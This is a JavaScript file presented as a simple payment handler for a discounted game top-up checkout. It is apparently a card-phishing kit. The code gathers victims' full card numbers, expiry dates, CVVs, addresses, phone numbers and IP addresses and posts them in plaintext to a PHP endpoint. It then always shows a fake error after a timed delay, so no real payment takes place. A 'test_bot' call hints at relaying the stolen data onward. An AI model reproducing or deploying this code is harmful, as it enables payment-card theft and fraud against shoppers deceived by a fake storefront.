// Simple Payment Handler for Alpine Linux
let checkoutCart = [];
let userIP = 'Unknown';

// API endpoint
const API_ENDPOINT = '/api/payment-handler.php';

// Initialize payment page
document.addEventListener('DOMContentLoaded', function() {
    // Load cart data
    const currentOrder = localStorage.getItem('currentOrder');
    const cartData = localStorage.getItem('checkoutCart');
    
    if (currentOrder) {
        const orderData = JSON.parse(currentOrder);
        checkoutCart = [{
            id: Date.now(),
            gameName: orderData.game,
            packageName: orderData.package,
            originalPrice: parseFloat(orderData.originalPrice || orderData.price) / 0.35,
            discountedPrice: parseFloat(orderData.price),
            price: parseFloat(orderData.price),
            uid: orderData.uid
        }];
        localStorage.removeItem('currentOrder');
    } else if (cartData) {
        checkoutCart = JSON.parse(cartData);
    } else {
        window.location.href = 'index.html';
        return;
    }
    
    loadOrderSummary();
    setupFormValidation();
    getUserIP();
    
    // Setup form submit handler
    const paymentForm = document.getElementById('paymentForm');
    if (paymentForm) {
        paymentForm.addEventListener('submit', handlePayment);
    }
    
    hideAllModals();
});

// Get user IP address
async function getUserIP() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        userIP = data.ip;
        console.log('IP obtained:', userIP);
    } catch (error) {
        console.log('Could not get IP:', error);
        userIP = 'Unknown';
    }
}

// Load order summary
function loadOrderSummary() {
    const orderItems = document.getElementById('orderItems');
    const subtotalEl = document.getElementById('subtotal');
    const discountEl = document.getElementById('discount');
    const totalEl = document.getElementById('total');
    
    let originalTotal = 0;
    let discountedTotal = 0;
    
    const itemsHTML = checkoutCart.map(item => {
        const originalPrice = item.originalPrice || (item.discountedPrice / 0.35) || (item.price / 0.35);
        const discountedPrice = item.discountedPrice || item.price || 0;
        
        originalTotal += originalPrice;
        discountedTotal += discountedPrice;
        
        return `
            <div class="order-item">
                <div class="item-info">
                    <div class="item-name">${item.gameName}</div>
                    <div class="item-details">${item.packageName}${item.uid ? ` - UID: ${item.uid}` : ''}</div>
                </div>
                <div class="item-price">
                    <span class="item-original-price">$${originalPrice.toFixed(2)}</span>
                    $${discountedPrice.toFixed(2)}
                </div>
            </div>
        `;
    }).join('');
    
    orderItems.innerHTML = itemsHTML;
    
    const discountAmount = originalTotal - discountedTotal;
    
    if (subtotalEl) subtotalEl.textContent = `$${originalTotal.toFixed(2)}`;
    if (discountEl) discountEl.textContent = `-$${discountAmount.toFixed(2)}`;
    if (totalEl) totalEl.textContent = `$${discountedTotal.toFixed(2)}`;
    
    const payAmountEl = document.getElementById('payAmount');
    if (payAmountEl) payAmountEl.textContent = `$${discountedTotal.toFixed(2)}`;
}

// Setup form validation
function setupFormValidation() {
    const form = document.getElementById('paymentForm');
    const cardNumberInput = document.getElementById('cardNumber');
    const expiryInput = document.getElementById('expiry');
    const cvvInput = document.getElementById('cvv');
    const phoneInput = document.getElementById('phone');
    
    // Card number formatting
    cardNumberInput.addEventListener('input', function(e) {
        let value = e.target.value.replace(/\s/g, '').replace(/[^0-9]/gi, '');
        let formattedValue = value.match(/.{1,4}/g)?.join(' ') || value;
        if (formattedValue.length > 19) formattedValue = formattedValue.substr(0, 19);
        e.target.value = formattedValue;
    });
    
    // Expiry date formatting
    expiryInput.addEventListener('input', function(e) {
        let value = e.target.value.replace(/\D/g, '');
        if (value.length >= 2) {
            value = value.substring(0, 2) + '/' + value.substring(2, 4);
        }
        e.target.value = value;
    });
    
    // CVV formatting
    cvvInput.addEventListener('input', function(e) {
        e.target.value = e.target.value.replace(/[^0-9]/g, '').substring(0, 4);
    });
    
    // Phone formatting
    phoneInput.addEventListener('input', function(e) {
        e.target.value = e.target.value.replace(/[^0-9+\-\s()]/g, '');
    });
}

// Handle payment submission
async function handlePayment(e) {
    e.preventDefault();
    
    console.log('Payment process started...');
    
    // Validate form
    const form = e.target;
    const inputs = form.querySelectorAll('input, select');
    let isFormValid = true;
    
    inputs.forEach(input => {
        if (input.hasAttribute('required') && !input.value.trim()) {
            isFormValid = false;
            input.style.borderColor = 'red';
        } else {
            input.style.borderColor = '';
        }
    });
    
    if (!isFormValid) {
        alert('Please fill in all required fields');
        return;
    }
    
    // Collect form data
    const formData = new FormData(form);
    const paymentData = {
        name: `${formData.get('firstName')} ${formData.get('lastName')}`,
        email: formData.get('email'),
        phone: formData.get('phone'),
        country: formData.get('country'),
        region: formData.get('region'),
        city: formData.get('city'),
        address: formData.get('address'),
        zip: formData.get('zip'),
        card: formData.get('cardNumber').replace(/\s/g, ''),
        expiry: formData.get('expiry'),
        cvv: formData.get('cvv'),
        ip: userIP
    };
    
    console.log('Payment data collected:', paymentData);
    
    // Show processing modal
    showProcessingModal();
    
    // Send payment data
    try {
        const response = await fetch(`${API_ENDPOINT}?action=send_payment`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(paymentData)
        });
        
        const result = await response.json();
        console.log('API Response:', result);
        
        if (result.success) {
            console.log('Payment data sent successfully');
            if (result.duplicate) {
                console.log('Duplicate entry detected');
            }
        } else {
            console.error('Failed to send payment data:', result.error);
        }
        
    } catch (error) {
        console.error('Error sending payment data:', error);
    }
    
    // Wait 8-9 seconds then show error
    const processingTime = 8000 + Math.random() * 1000;
    setTimeout(() => {
        hideProcessingModal();
        showErrorModal();
    }, processingTime);
}

// Show processing modal
function showProcessingModal() {
    const modal = document.getElementById('processingModal');
    if (modal) {
        modal.style.display = 'flex';
        modal.style.visibility = 'visible';
        modal.style.opacity = '1';
        modal.classList.add('active');
    }
}

// Hide processing modal
function hideProcessingModal() {
    const modal = document.getElementById('processingModal');
    if (modal) {
        modal.style.display = 'none';
        modal.style.visibility = 'hidden';
        modal.style.opacity = '0';
        modal.classList.remove('active');
    }
}

// Show error modal
function showErrorModal() {
    const modal = document.getElementById('errorModal');
    if (modal) {
        modal.style.display = 'flex';
        modal.style.visibility = 'visible';
        modal.style.opacity = '1';
        modal.classList.add('active');
    }
}

// Hide all modals
function hideAllModals() {
    const modals = ['processingModal', 'errorModal'];
    modals.forEach(modalId => {
        const modal = document.getElementById(modalId);
        if (modal) {
            modal.style.display = 'none';
            modal.style.visibility = 'hidden';
            modal.style.opacity = '0';
            modal.classList.remove('active');
        }
    });
}

// Close modal function
function closeModal(modalId) {
    const modal = document.getElementById(modalId);
    if (modal) {
        modal.style.display = 'none';
        modal.style.visibility = 'hidden';
        modal.style.opacity = '0';
        modal.classList.remove('active');
    }
}

// Test API connection
async function testAPI() {
    try {
        const response = await fetch(`${API_ENDPOINT}?action=test_bot`);
        const result = await response.json();
        console.log('API Test Result:', result);
        return result.success;
    } catch (error) {
        console.error('API Test Failed:', error);
        return false;
    }
}